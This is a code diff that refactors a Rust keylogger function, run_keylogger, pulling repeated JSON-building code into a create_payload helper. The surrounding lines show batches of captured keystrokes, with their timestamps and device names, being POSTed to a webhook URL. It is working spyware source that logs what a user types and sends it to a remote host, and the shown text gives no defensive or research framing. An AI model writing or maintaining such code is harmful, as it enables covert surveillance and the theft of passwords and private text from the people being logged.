@@ -132,6 +132,19 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
             const BATCH_SIZE: usize = 20; // Send in batches of 20 keystrokes
             const BATCH_TIMEOUT_MS: u64 = 2000; // Or send after 2 seconds
             
+            // Helper function to create JSON payload from batch
+            let create_payload = |batch: &[KeystrokeData]| {
+                json!({
+                    "keystrokes": batch.iter().map(|d| {
+                        json!({
+                            "timestamp": d.timestamp,
+                            "device": d.device,
+                            "key": d.key
+                        })
+                    }).collect::<Vec<_>>()
+                })
+            };
+            
             let mut batch: Vec<KeystrokeData> = Vec::with_capacity(BATCH_SIZE);
             let mut last_send = std::time::Instant::now();
             
@@ -148,16 +161,7 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
                                         last_send.elapsed().as_millis() as u64 >= BATCH_TIMEOUT_MS;
                         
                         if should_send && !batch.is_empty() {
-                            // Convert batch to JSON array
-                            let payload = json!({
-                                "keystrokes": batch.iter().map(|d| {
-                                    json!({
-                                        "timestamp": d.timestamp,
-                                        "device": d.device,
-                                        "key": d.key
-                                    })
-                                }).collect::<Vec<_>>()
-                            });
+                            let payload = create_payload(&batch);
                             
                             match client.post(&url).json(&payload).send() {
                                 Ok(_) => {
@@ -175,15 +179,7 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
                     Err(mpsc::RecvTimeoutError::Timeout) => {
                         // Check if we should send accumulated batch due to timeout
                         if !batch.is_empty() && last_send.elapsed().as_millis() as u64 >= BATCH_TIMEOUT_MS {
-                            let payload = json!({
-                                "keystrokes": batch.iter().map(|d| {
-                                    json!({
-                                        "timestamp": d.timestamp,
-                                        "device": d.device,
-                                        "key": d.key
-                                    })
-                                }).collect::<Vec<_>>()
-                            });
+                            let payload = create_payload(&batch);
                             
                             match client.post(&url).json(&payload).send() {
                                 Ok(_) => {
@@ -201,16 +197,7 @@ pub fn run_keylogger(log_path: &str, webhook_url: Option<String>) {
                     Err(mpsc::RecvTimeoutError::Disconnected) => {
                         // Channel closed, send any remaining data
                         if !batch.is_empty() {
-                            let payload = json!({
-                                "keystrokes": batch.iter().map(|d| {
-                                    json!({
-                                        "timestamp": d.timestamp,
-                                        "device": d.device,
-                                        "key": d.key
-                                    })
-                                }).collect::<Vec<_>>()
-                            });
-                            
+                            let payload = create_payload(&batch);
                             let _ = client.post(&url).json(&payload).send();
                         }
                         break;
